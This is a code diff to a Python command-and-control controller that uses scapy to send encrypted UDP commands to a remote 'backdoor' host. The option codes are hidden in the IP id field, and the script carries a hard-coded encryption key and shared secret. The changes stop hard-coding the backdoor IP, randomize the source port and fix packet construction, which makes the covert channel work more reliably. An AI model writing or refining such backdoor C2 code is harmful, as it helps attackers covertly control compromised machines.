@@ -2,7 +2,7 @@ from encryption import encryption
 from scapy.all import *
 from scapy.layers.inet import IP, UDP
 import logging
-import HttpServerReceiver
+
 
 key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
 code = "secret"
@@ -10,8 +10,8 @@ SIZE = 1024
 
 
 def main():
-    # ip = input("Enter backdoor IP: ")
-    ip = "192.168.1.26"
+    ip = input("Enter backdoor IP: ")
+    # ip = "192.168.1.26"
     controller = c2(ip)
     try:
         while True:
@@ -118,8 +118,9 @@ class c2:
     def command_sender(self, opt, data):
         rand_id = int(str(random.randrange(100, 999)) + str(opt))
         port = 10001
+        s_port = random.randrange(35000, 62000)
         encrypted_data = self.encrypter.encrypt(code + ":" + data)
-        dgram = IP(dst=self.kit_ip, id=rand_id / UDP(dport=port, len=len(encrypted_data)) / encrypted_data)
+        dgram = IP(dst=self.kit_ip, id=rand_id) / UDP(sport=s_port, dport=port, len=int(len(encrypted_data))) / encrypted_data
         send(dgram, verbose=0)
 
 
